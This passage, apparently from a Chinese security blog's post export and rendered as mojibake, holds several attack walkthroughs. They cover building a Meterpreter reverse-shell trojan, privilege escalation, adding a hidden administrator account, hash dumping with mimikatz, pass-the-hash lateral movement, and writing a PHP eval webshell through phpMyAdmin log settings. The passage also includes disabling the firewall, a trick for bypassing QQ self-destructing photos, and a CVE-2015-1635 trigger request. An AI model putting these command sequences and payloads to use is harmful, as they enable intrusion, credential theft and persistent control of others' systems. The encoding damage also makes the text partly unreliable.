äºŒã€Win2008ä¸»æœºä¸Šçº¿msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.6 lport=4444 -f exe &gt; /var/www/html/w01ke.exemsfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196ser lport 4444exploit ä¸‰ã€ç®€å•ä¿¡æ¯æ”¶é›†ä¿¡æ¯æ”¶é›†ä¹‹å‰å¯ä»¥è¾“å…¥helpäº†è§£ä¸€ä¸‹meterpreterä¸‹çš„å‘½ä»¤ï¼Œå…¶ä¸­æœ‰ä¿¡æ¯æ”¶é›†ï¼Œææƒç­‰å¤šä¸ªæ¨¡å—ï¼Œè‡ªè¡Œäº†è§£ ï¼ˆ1ï¼‰æŸ¥çœ‹ç›®æ ‡ä¸»æœºå½“å‰ç”¨æˆ·ä¸æƒé™meterpreter &gt; getuid ï¼ˆ2ï¼‰æŸ¥çœ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿç›¸å…³ä¿¡æ¯meterpreter&gt; sysinfo ï¼ˆ3ï¼‰æŸ¥çœ‹ç›®æ ‡ä¸»æœºè·¯ç”±è¡¨meterpreter &gt; route ï¼ˆ4ï¼‰æŸ¥çœ‹ç›®æ ‡ä¸»æœºè¿è¡Œè¿›ç¨‹meterpreter&gt; ps å››ã€è¿ç§»/æ³¨å…¥è¿›ç¨‹æˆ‘ä»¬çš„æœ¨é©¬w01ke.exeå¦‚æœæˆ‘ä»¬é€€å‡ºäº†shellä¼šè¯æˆ–è€…å¯¹æ–¹å…³æœºï¼Œæˆ‘ä»¬éƒ½ä¼šä¸¢å¤±å¯¹ç›®æ ‡ä¸»æœºWin2008çš„æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿›ç¨‹æ³¨å…¥åˆ°ç›®æ ‡ä¸»æœºWin2008çš„å¸¸ç”¨è¿›ç¨‹ï¼Œè¿™æ ·æ¯æ¬¡ç›®æ ‡ä¸»æœºWin2008å¯åŠ¨äº†è¢«æ³¨å…¥çš„æœåŠ¡è¿›ç¨‹ï¼Œæˆ‘ä»¬çš„æœ¨é©¬ä¹Ÿä¼šä¸Šçº¿ è¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ³¨å…¥åˆ°explorer.exeï¼Œé€šè¿‡ä¸Šé¢çš„ä¿¡æ¯æ”¶é›†å¯ä»¥çŸ¥é“è¿›ç¨‹explorer.exeçš„PIDä¸º1560ï¼Œw01ke.exeçš„PIDä¸º2016 ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œè¿ç§» meterpreter&gt; migrate 1560 æ­¤æ—¶å†æ¬¡æŸ¥çœ‹ç›®æ ‡ä¸»æœºè¿›ç¨‹ï¼Œå·²ç»æ²¡æœ‰w01ke.exeäº† äº”ã€ææƒmeterpreter&gt; getuid æŸ¥çœ‹å½“å‰ç”¨æˆ·meterpreter&gt; getprivs å°½å¯èƒ½æå‡æƒé™meterpreter&gt; getsystem é€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡ç³»ç»Ÿç”¨æˆ·æƒé™ å…­ã€æŒä¹…åé—¨ï¼šæ·»åŠ éšè—ç”¨æˆ·meterpreter &gt; shell C:\\Windows\\system32&gt;net user test$ 123456 /add &amp; net localgroup administrators test$ /add ä¸ƒã€æ‰«æå†…ç½‘å­˜æ´»ä¸»æœºmeterpreter&gt; info post/multi/gather/ping_sweepmeterpreter&gt; run post/multi/gather/ping_sweep rhosts=10.10.10.1-10.10.10.5meterpreter&gt; run post/multi/gather/ping_sweep rhosts=10.10.10.0/24è¿™ä¸ªæ¨¡å—ä¼šå°è¯•pingå†…ç½‘çš„ä¸»æœºï¼Œå¦‚æœæœ‰å›åŒ…ï¼Œè¯´æ˜è¯¥ä¸»æœºå­˜æ´» meterpreter&gt; info post/windows/gather/arp_scannermeterpreter&gt; run post/windows/gather/arp_scanner rhosts=10.10.10.1-10.10.10.5meterpreter&gt; run post/windows/gather/arp_scanner rhosts=10.10.10.0/24è¿™ä¸ªæ¨¡å—ä¼šå°è¯•å‘é€arpåŒ…ï¼Œå¦‚æœæœ‰å›åŒ…ï¼Œè¯´æ˜è¯¥ä¸»æœºå­˜æ´» å…«ã€æ·»åŠ å†…ç½‘è·¯ç”±meterpreter&gt; run autoroute -s 10.10.10.0/24meterpreter&gt; run autoroute -pæˆ–è€…meterpreter&gt; run post/multi/manage/autoroute ä¹ã€æ‰«æå†…ç½‘ä¸»æœºå¼€æ”¾çš„ç«¯å£é€šè¿‡MSF SOCKSä»£ç†æ¨¡å—ï¼Œç”¨nmapæ‰«æå†…ç½‘ä¸»æœºå¼€æ”¾çš„ç«¯å£ ï¼ˆ1ï¼‰é…ç½®SOCKSä»£ç†meterpreter&gt; backgroundmsf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxymsf6 auxiliary(server/socks_proxy) &gt; set srvhost 192.168.1.8(Win2008çš„IP)msf6 auxiliary(server/socks_proxy) &gt; exploit -j ä¿®æ”¹proxychainsé…ç½® vim /etc/proxychains4.conf ï¼ˆ2ï¼‰ä½¿ç”¨nmapè¿›è¡Œæ‰«æproxychains nmap -sT -Pn -sV -p 22,80,445,3306 10.10.10.128-129 --open -oN 10.10.10.0.txt çœ‹åˆ°æ•°æ®æœåŠ¡å™¨10.10.10.128å¼€å¯äº†445ç«¯å£ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘Hashä¼ é€’æ”»å‡»ï¼ˆç›´æ¥ä½¿ç”¨å¯†æ–‡ç™»å½•ï¼‰ åã€æ”»å‡»å†…ç½‘ä¸»æœºçœ‹åˆ°æ•°æ®æœåŠ¡å™¨10.10.10.128å¼€å¯äº†445ç«¯å£ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘Hashä¼ é€’æ”»å‡»ï¼ˆç›´æ¥ä½¿ç”¨å¯†æ–‡ç™»å½•ï¼‰ ï¼ˆ1ï¼‰æå–Win2008çš„å¯†ç Hashmeterpreter&gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ä»¥aad3b435å¼€å¤´çš„å“ˆå¸Œå€¼æ˜¯ä¸€ä¸ªç©ºçš„æˆ–ä¸å­˜åœ¨çš„å“ˆå¸Œå€¼ï¼ˆç©ºå­—ä¸²çš„å ä½ç¬¦ï¼‰ windowsç³»ç»Ÿå­˜å‚¨å“ˆå¸Œå€¼çš„æ–¹å¼ä¸€èˆ¬ä¸ºLAN Managerï¼ˆLMï¼‰ã€NT LAN Managerï¼ˆNTLMï¼‰ï¼Œæˆ–NT LAN Manager v2ï¼ˆNTLMv2ï¼‰ã€‚ åœ¨LMå­˜å‚¨æ–¹å¼ä¸­ï¼Œå½“ç”¨æˆ·é¦–æ¬¡è¾“å…¥å¯†ç æˆ–æ›´æ”¹å¯†ç çš„æ—¶å€™ï¼Œå¯†ç è¢«è½¬æ¢ä¸ºå“ˆå¸Œå€¼ï¼Œç”±äºå“ˆå¸Œé•¿åº¦çš„é™åˆ¶ï¼Œå°†å¯†ç åˆ‡åˆ†ä¸º7ä¸ªå­—ç¬¦ä¸€ç»„çš„å“ˆå¸Œå€¼ã€‚ä»¥password123456çš„å¯†ç ä¸ºä¾‹ï¼Œå“ˆå¸Œå€¼ä»¥passworå’Œd123456çš„æ–¹å¼å­˜å‚¨ï¼Œæ‰€ä»¥æ”»å‡»è€…åªéœ€è¦ç®€å•åœ°ç ´è§£7ä¸ªå­—ç¬¦ä¸€ç»„çš„å¯†ç ï¼Œè€Œä¸æ˜¯åŸå§‹çš„4ä¸ªå­—ç¬¦ã€‚è€ŒNTLMçš„å­˜å‚¨æ–¹å¼è·Ÿå¯†ç é•¿åº¦æ— å…³ï¼Œå¯†ç password123456å°†ä½œä¸ºæ•´ä½“è½¬æ¢ä¸ºå“ˆå¸Œå€¼å­˜å‚¨ã€‚ è€Œä¸Šé¢aad3b435b51404eeaad3b435b51404eeæ˜¯LMå“ˆå¸Œï¼Œafffeba176210fad4628f0524bfe1942æ˜¯NTLMå“ˆå¸Œ ï¼ˆ2ï¼‰é…ç½®SMBæ”»å‡»æ¨¡å—ï¼Œä¼ é€’å“ˆå¸Œmsf6 auxiliary(server/socks_proxy) &gt; use exploit/windows/smb/psexecmsf6 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/bind_tcpè¿™é‡Œä¸èƒ½ç”¨reverse_tcpäº†å› ä¸ºè¿™æ˜¯å†…ç½‘ç¯å¢ƒäº†æ²¡åŠæ³•å¼¹å›æˆ‘ä»¬å¤–ç½‘çš„kaliæ¥ï¼ˆé™¤éåšäº†éš§é“ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨æ­£å‘è¿æ¥msf6 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.128msf6 exploit(windows/smb/psexec) &gt; set smbuser Administratorè¿™é‡Œçš„smbuserè®¾ç½®ä¸ºAdministratoræ˜¯å› ä¸ºä¸Šä¸€æ­¥è·å–hashæ—¶å¾—åˆ°äº†Administratormsf6 exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942msf6 exploit(windows/smb/psexec) &gt; exploit ç”±äºæ•°æ®æœåŠ¡å™¨Win7çš„Administratorè´¦æˆ·å·²è¢«ç¦ç”¨ï¼Œå› æ­¤æŠ¥é”™äº† ä¸ºäº†å®éªŒé¡ºåˆ©è¿›è¡Œï¼Œå–æ¶ˆç¦ç”¨ å†æ¬¡exploitï¼ŒæˆåŠŸæ§åˆ¶æ•°æ®æœåŠ¡å™¨Win7 ï¼ˆ3ï¼‰åˆ©ç”¨ kiwi(mimikatz) è¿›è¡Œä¿¡æ¯æ”¶é›†meterpreter &gt; load kiwiKiwi Commands=============Command Description------- -----------creds_all Retrieve all credentials (parsed)creds_kerberos Retrieve Kerberos creds (parsed)creds_livessp Retrieve Live SSP credscreds_msv Retrieve LM/NTLM creds (parsed)creds_ssp Retrieve SSP credscreds_tspkg Retrieve TsPkg creds (parsed)creds_wdigest Retrieve WDigest creds (parsed)dcsync Retrieve user account information via DCSync (unparsed)dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSyncgolden_ticket_create Create a golden kerberos ticketkerberos_ticket_list List all kerberos tickets (unparsed)kerberos_ticket_purge Purge any in-use kerberos ticketskerberos_ticket_use Use a kerberos ticketkiwi_cmd Execute an arbitary mimikatz command (unparsed)lsa_dump_sam Dump LSA SAM (unparsed) æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿçš„ SAMdumpï¼šlsa_dump_secrets Dump LSA secrets (unparsed) æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿçš„å¯†ç password_change Change the password/hash of a userwifi_list List wifi profiles/creds for the current userwifi_list_shared List shared wifi profiles/creds (requires SYSTEM) å¯ä»¥çœ‹åˆ°æ˜æ–‡å¯†ç 123456ï¼ˆå¦‚æœæ²¡æœ‰æ˜æ–‡å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ï¼‰ ï¼ˆ4ï¼‰å¼€å¯è¿œç¨‹æ¡Œé¢Usage: run getgui -u &lt;username&gt; -p &lt;password&gt;Or: run getgui -eOPTIONS: -e Enable RDP only. -f &lt;opt&gt; Forward RDP Connection. -h Help menu. -p &lt;opt&gt; The Password of the user to add. -u &lt;opt&gt; The Username of the user to add. å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡ ï¼ˆ5ï¼‰è¿œç¨‹è¿æ¥â‘  ä½¿ç”¨ä¹‹å‰éƒ¨ç½²å¥½çš„proxychainsproxychains rdesktop -u Administrator -p 123.com 10.10.10.128:3389 â‘¡ ä½¿ç”¨ç«¯å£è½¬å‘meterpreter &gt; portfwd add -l 13389 -p 3389 -r 10.10.10.128rdesktop -u Administrator -p 123.com 127.0.0.1:13389","categories":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"https://wolke.cn/tags/Kali/"}],"author":"w01ke"},{"title":"phpMyAdminææƒ","slug":"phpMyAdminææƒ","date":"2022-04-28T08:09:47.000Z","updated":"2022-04-28T08:19:38.161Z","comments":true,"path":"post/3256b484.html","link":"","permalink":"https://wolke.cn/post/3256b484.html","excerpt":"","text":"ä¸€ã€æ¡ä»¶ èƒ½æˆåŠŸç™»å½•åˆ°phpMyAdminé‡Œå» æœ‰è¯»ã€å†™ã€æ‰§è¡Œçš„æƒé™ çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ äºŒã€æ“ä½œæ­¥éª¤1ã€çˆ†æ•°æ®åº“å®‰è£…è·¯å¾„ï¼ˆ1ï¼‰SQLè¯­å¥æŸ¥è¯¢SHOW GLOBAL VARIABLES LIKE &quot;%datadir%&quot;;select @@basedir; å› ä¸ºphpstudyæ˜¯é›†æˆç¯å¢ƒï¼Œæ‰€ä»¥ç½‘ç«™ç‰©ç†è·¯å¾„æ˜¯D:\\phpstudy_pro\\WWW ï¼ˆ2ï¼‰æ•æ„Ÿæ–‡ä»¶ç›´æ¥åœ¨urlåé¢è¾“å…¥phpinfo.phpï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è¯»å‡ºè¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨å°±ä¼šæŠŠç½‘ç«™çš„ç»å¯¹è·¯å¾„æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·çš„æƒ…å†µç‰¹å°‘ï¼Œå› ä¸ºç½‘ç«™ç®¡ç†äººå‘˜ä¸å¯èƒ½æŠŠè¿™ä¸ªæµ‹è¯•é¡µé¢åœ¨äº’è”ç½‘ä¸Šé¢ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œä»–ä»¬æˆ–è®¸ä¼šæ›´æ”¹è·¯å¾„æˆ–è®¸ä¼šè®¾ç½®ç›®å½•è®¿é—®æƒé™ï¼› ï¼ˆ3ï¼‰æ‰«æç½‘ç«™ä½¿ç”¨æ‰«æå·¥å…·å¯¹ç½‘ç«™è¿›è¡Œæ‰«æ‰«æï¼›æ‰«æä¸€äº›phpinfo.php info.php php.php test.phpç­‰ç­‰ï¼› ï¼ˆ4ï¼‰è¯»å–é…ç½®æ–‡ä»¶ Windows2003 IIS 6 C:\\Windows/system32\\inetsrv\\metabase.xml Win2008/2012 IIS 7.5 C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config Nginx /etc/nginx/conf.d/vhost.conf /usr/local/etc/nginx/nginx.conf Apache /etc/httpd/conf/httpd.conf/usr/local/apache2/conf/httpd.conf 2ã€æŸ¥çœ‹secure_file_privåœ¨ä¸Šé¢æˆ‘ä»¬å·²ç»è·çŸ¥äº†ç½‘ç«™é»˜è®¤çš„è·¯å¾„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è‚¯å®šæƒ³æ’å…¥ä¸€å¥è¯åé—¨æ–‡ä»¶æˆ–è€…æ˜¯å¯¼å‡ºshellã€‚é‚£å¦‚æœæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»¥ä¸Šä¸¤ç§æ€è·¯ä¸­çš„ä¸€ç§å¿…é¡»æ»¡è¶³ä¸€ä¸ªå‰ææ¡ä»¶secure_file_privå¯¹åº”çš„å€¼ä¸èƒ½ä¸ºç©ºä¸”å¿…é¡»ä¸ºé»˜è®¤ç½‘ç«™çš„è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»æå‰æ£€æµ‹ä¸€ä¸‹secure_file_privçš„å€¼ã€‚ secure_file_privä¸ºnull è¡¨ç¤ºä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼› secure_file_privæŒ‡å®šæ–‡ä»¶å¤¹æ—¶ï¼Œè¡¨ç¤ºmysqlçš„å¯¼å…¥å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨æŒ‡å®šçš„æ–‡ä»¶å¤¹ï¼› secure_file_privæ²¡æœ‰è®¾ç½®æ—¶ï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼› SHOW VARIABLES LIKE &quot;%secure_file_priv%&quot;; ä»ä¸Šå›¾å¾—çŸ¥å€¼ä¸ºç©ºï¼Œå¦‚æœæˆ‘ä»¬è¿™æ—¶å¯¼å…¥ä¸€å¥è¯ï¼Œè‚¯å®šä¼šå¤±è´¥çš„ SELECT &#x27;&lt;?php @eval($_POST[w01ke]);?&gt;&#x27; INTO OUTFILE &#x27;D:\\\\phpstudy_pro\\\\WWW\\\\w01ke.php&#x27;; å¦‚æœè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢2ç§æ–¹å¼ï¼š å°†ä½ è¦å¯¼å…¥æˆ–å¯¼å‡ºçš„æ–‡ä»¶ä½ç½®æŒ‡å®šåˆ°ä½ è®¾ç½®çš„è·¯å¾„é‡Œï¼Œä¹Ÿå°±æ˜¯åŠ¨æ€ä¿®æ”¹ SET GLOBAL secure_file_priv = &quot;D:/phpstudy_pro/WWW&quot;; ç”±äºä¸èƒ½åŠ¨æ€ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹my.cnfé‡Œå…³äºè¿™ä¸ªé€‰é¡¹çš„é…ç½®ï¼Œç„¶åé‡å¯å³å¯ã€‚ ä½†å¹³å¸¸éƒ½æ˜¯é»‘ç›’æµ‹è¯•ï¼Œæœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å‘¢ï¼Œæœ‰ 3ã€åˆ©ç”¨æ—¥å¿—æ–‡ä»¶æˆ–å¤‡ä»½æ–‡ä»¶æ¥å†™å…¥ä¸€å¥è¯ï¼ˆ1ï¼‰æ—¥å¿—æ–‡ä»¶ç‚¹å‡»å˜é‡é€‰é¡¹ï¼Œæœç´¢genå°±ä¼šå‡ºæ¥general_logå’Œgeneral_log_fileè¿™ä¸¤ä¸ªå˜é‡ï¼Œgeneral_logå˜é‡æ˜¯æŒ‡æ˜¯å¦å¯åŠ¨è®°å½•æ—¥å¿—ï¼›è€Œgeneral_log_fileæŒ‡çš„æ˜¯æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ï¼Œå¯ä»¥çœ‹åˆ°general_logå˜é‡çš„çŠ¶æ€ä¸ºOFFï¼Œæ•…æˆ‘ä»¬è¦ä¿®æ”¹ä¸ºONï¼›general_log_fileå˜é‡ä¸­çš„*.logçš„åç¼€æˆ‘ä»¬æ”¹ä¸º*.phpã€‚æ‹¿å®Œwebshellè®°å¾—è¦æ”¹å›å»å“Ÿã€‚ â‘  å¼€å¯æ—¥å¿—SET GLOBAL general_log = &quot;ON&quot;; â‘¡ ä¿®æ”¹æ—¥å¿—æ–‡ä»¶ä¿å­˜çš„ä½ç½®SET GLOBAL general_log_file = &quot;D:\\\\phpstudy_pro\\\\WWW\\\\w01ke.php&quot;; w01ke.phpçš„å†…å®¹æ˜¯æ—¥å¿—æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ‰§è¡Œçš„SQLè¯­å¥ â‘¢ å†™å…¥ä¸€å¥è¯SELECT &#x27;&lt;?php @eval($_POST[w01ke]);?&gt;&#x27;; â‘£ æŸ¥çœ‹ä¿®æ”¹åçš„ä¿¡æ¯ï¼ˆéšä¾¿ï¼‰SHOW VARIABLES LIKE &quot;%general%&quot;; é»˜è®¤æƒ…å†µå¦‚ä¸‹ ï¼ˆ2ï¼‰å¤‡ä»½æ–‡ä»¶â‘  å¼€å¯å¤‡ä»½æ—¥å¿—SET GLOBAL slow_query_log = &quot;ON&quot;; â‘¡ ä¿®æ”¹å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¿å­˜çš„ä½ç½®SET GLOBAL slow_query_log_file= &quot;D:\\\\phpstudy_pro\\\\WWW\\\\w01ke2.php&quot;; â‘¢ å†™å…¥ä¸€å¥è¯å¤‡ä»½çš„ï¼Œæ ¹æ®å…¶ä»–å¸ˆå‚…å°è¯•ï¼Œéœ€è¦ç”¨å»¶è¿Ÿæ‰èƒ½æˆåŠŸæ³¨å…¥ SELECT 99999999999999999,&#x27;&lt;?php @eval($_POST[w01ke2]);?&gt;&#x27; OR sleep(11); â‘£ æŸ¥çœ‹ä¿®æ”¹åçš„ä¿¡æ¯ï¼ˆéšä¾¿ï¼‰SHOW VARIABLES LIKE &quot;%slow_query_log%&quot;; é»˜è®¤æƒ…å†µä¸‹ 4ã€èšå‰‘è¿æ¥ 5ã€ææƒï¼ˆ1ï¼‰æŠ“å–hashå¯†ç ä¸Šä¼ æŠ“å–hashå¯†ç çš„å·¥å…·ï¼ŒæˆåŠŸæŠ“å–åˆ°ç®¡ç†å‘˜å¯†ç ï¼š ï¼ˆ2ï¼‰æ·»åŠ æ–°ç”¨æˆ·åˆ°ç®¡ç†å‘˜ç»„åœ¨è™šæ‹Ÿç»ˆç«¯æ·»åŠ æµ‹è¯•è´¦å·test$ï¼Œå¹¶å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ï¼š ï¼ˆ3ï¼‰å¼€å¯3389ç«¯å£ç»æŸ¥è¯¢ä¸»æœºæœªå¼€å¯3389è¿œç¨‹ç™»é™†åŠŸèƒ½ï¼Œæ•…ä¸Šä¼ å¼€å¯3389çš„batæ–‡ä»¶è¿›è¡Œå¼€å¯ï¼š ï¼ˆ4ï¼‰å…³é—­é˜²ç«å¢™netsh advfirewall set allprofiles state off ï¼ˆ5ï¼‰è¿œç¨‹è¿æ¥æˆåŠŸè¿æ¥æœåŠ¡å™¨ï¼Œç”±äºæœ¬æœºadministratoræ²¡æœ‰è®¾ç½®å¯†ç ï¼Œæ•…åªæ˜¯æ‹¿è‡ªå·±çš„ç™»é™†åç§°è¿›è¡Œæµ‹è¯•ï¼Œåœ¨å®é™…ç«™ç‚¹æµ‹è¯•çš„æ—¶å€™ä¸€èˆ¬éƒ½æœ‰ç®¡ç†å‘˜å¯†ç ï¼Œåªä¸è¿‡æœ‰çš„æœåŠ¡å™¨çš„ç™»é™†ç”¨æˆ·åä¼šä¿®æ”¹(é‡åˆ°çš„æƒ…å†µæœ‰çš„ç‰¹åˆ«å˜æ€ï¼Œæ¯”å¦‚ç«¯å£ä¿®æ”¹ã€ç”¨æˆ·åä¿®æ”¹ã€é˜²æŠ¤è½¯ä»¶ç­‰)ï¼š ä¸‰ã€å‚è€ƒé“¾æ¥ https://blog.csdn.net/ga421739102/article/details/103924232 https://zhuanlan.zhihu.com/p/55466863","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"phpMyAdmin","slug":"phpMyAdmin","permalink":"https://wolke.cn/tags/phpMyAdmin/"}],"author":"w01ke"},{"title":"å¦‚ä½•çº¯æ‰‹å·¥ç ´è§£QQé—ªç…§ï¼Ÿä¸é™æ¬¡æ•°è§‚çœ‹","slug":"å¦‚ä½•çº¯æ‰‹å·¥ç ´è§£QQé—ªç…§ï¼Ÿä¸é™æ¬¡æ•°è§‚çœ‹","date":"2022-04-22T02:49:38.000Z","updated":"2022-04-22T04:52:45.741Z","comments":true,"path":"post/a5c589f5.html","link":"","permalink":"https://wolke.cn/post/a5c589f5.html","excerpt":"","text":"ä¸€ã€æ‚è°ˆæœ‰çš„æ—¶å€™é‡åˆ°å¿ƒä»ªçš„å¥³/ç”·å­©å­å‘ç…§ç‰‡ï¼Œæˆ–è€…æ˜¯hxdå‘çš„å¥½ä¸œè¥¿ï¼Œæˆ–è€…æ˜¯ä¸€äº›æ¶‰åŠä¿¡æ¯æ³„éœ²çš„ç…§ç‰‡ï¼Œå¤§å¤šæ•°éƒ½æ˜¯ä»¥é—ªç…§çš„å½¢å¼æ¥æ”¶ã€‚ä½†å¦‚æœæƒ³åå¤æŸ¥çœ‹å‡ æ¬¡ï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ ä¸‹é¢æ•™å¤§å®¶æ‰‹å·¥çš„æ–¹å¼å®ç°æ— é™æ¬¡è§‚çœ‹é—ªç…§ï¼Œåˆ†ä¸ºè§†é¢‘æ•™ç¨‹å’Œå›¾æ–‡æ¼”ç¤º äºŒã€è§†é¢‘æ•™ç¨‹(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer1\"),\"theme\":\"#da4e7f\",\"screenshot\":true,\"video\":{\"url\":\"/video/2022042201.mp4\",\"pic\":\"https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599015839-05a1e65d-5801-400f-8688-93b08967ffb1.jpeg\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() ä¸‰ã€å›¾æ–‡æ¼”ç¤ºæˆ‘ä»¬æ­£å¸¸æ”¶åˆ°é—ªç…§æŸ¥çœ‹5ç§’å®Œæ¯•åï¼Œé—ªç…§ä¼šè‡ªåŠ¨é”€æ¯ æ­¤æ—¶æˆ‘ä»¬ç‚¹å³ä¸Šè§’ åˆ é™¤èŠå¤©è®°å½•ï¼ˆåˆ é™¤æ¼«æ¸¸è®°å½•ä¸å‹¾é€‰ï¼‰ ç„¶åæˆ‘ä»¬ç‚¹å‡»æŸ¥æ‰¾èŠå¤©è®°å½• é€‰æ‹©å…¨éƒ¨ å‘ç°é—ªç…§åˆå›æ¥äº†ï¼Œå¯ä»¥ç»§ç»­é•¿æŒ‰æŸ¥çœ‹ æˆ–è€…ç›´æ¥å›åˆ°èŠå¤©ç•Œé¢ï¼Œåˆå¯ä»¥é‡å¤æ‰“å¼€è§‚çœ‹äº† æŸ¥çœ‹åï¼Œæ­¤æ—¶é—ªç…§åˆé”€æ¯äº†ï¼Œæˆ‘ä»¬åªéœ€è¦é‡å¤åˆ é™¤èŠå¤©è®°å½•ï¼ˆå–æ¶ˆå‹¾é€‰æ¼«æ¸¸ï¼‰â€“æŸ¥çœ‹èŠå¤©è®°å½•â€“é€‰æ‹©å…¨éƒ¨ï¼Œè¿™æ ·å°±åˆå¯ä»¥æŸ¥çœ‹é—ªç…§äº†","categories":[{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"QQæŠ€æœ¯","slug":"QQæŠ€æœ¯","permalink":"https://wolke.cn/tags/QQ%E6%8A%80%E6%9C%AF/"}],"author":"w01ke"},{"title":"HTTP.sysè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2015-1635ï¼‰","slug":"HTTP-sysè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2015-1635ï¼‰","date":"2022-04-19T04:03:42.000Z","updated":"2022-04-19T04:26:27.306Z","comments":true,"path":"post/bd0dfd63.html","link":"","permalink":"https://wolke.cn/post/bd0dfd63.html","excerpt":"","text":"å‰è¨€æœ€è¿‘å’Œå¸ˆå‚…ä»¬å‚ä¸äº†ä¸€äº›ä¼—æµ‹é¡¹ç›®ï¼Œå‘ç°å¸ˆå‚…ä»¬æäº¤äº†å¾ˆå¤šå…³äºHTTP.sysè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œäºæ˜¯åœ¨ç½‘ä¸Šæœé›†äº†äº›èµ„æ–™è¿›è¡Œå­¦ä¹  ä¸€ã€æ¼æ´æ¦‚è¿°1ã€HTTP.sysç®€ä»‹HTTP.sysæ˜¯Microsoft Windowså¤„ç†HTTPè¯·æ±‚çš„å†…æ ¸é©±åŠ¨ç¨‹åºï¼Œä¸ºäº†ä¼˜åŒ–IISæœåŠ¡å™¨æ€§èƒ½ï¼Œä»IIS6.0å¼•å…¥ï¼ŒIISæœåŠ¡è¿›ç¨‹ä¾èµ–HTTP.sysã€‚HTTP.sysè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å®è´¨æ˜¯HTTP.sysçš„æ•´æ•°æº¢å‡ºæ¼æ´ æˆ‘ä»¬é€šè¿‡ç»™IISæœåŠ¡å™¨å‘é€è¿™æ ·æ ¼å¼çš„HTTPè¯·æ±‚ï¼Œå°±å¯ä»¥è§¦å‘ï¼ˆæ£€æµ‹ï¼‰è¿™ä¸ªæ¼æ´ï¼š GET / HTTP/1.1Host: stuffRange: bytes=0-18446744073709551615 è‹¥IISæœåŠ¡å™¨è¿”å›â€œRequested Range Not Satisfiableâ€ï¼Œåˆ™æ˜¯å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™å¦‚æœè¿”å›â€œThe request has an invalid header nameâ€ï¼Œåˆ™è¯´æ˜æ¼æ´å·²ç»ä¿®è¡¥ã€‚ 2ã€æ¼æ´æˆå› è¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´å­˜åœ¨äº HTTP åè®®å †æ ˆ (HTTP.sys) ä¸­ï¼Œå½“HTTP.sysæœªæ­£ç¡®åˆ†æç»ç‰¹æ®Šè®¾è®¡çš„ HTTP è¯·æ±‚æ—¶ä¼šå¯¼è‡´æ­¤æ¼æ´ 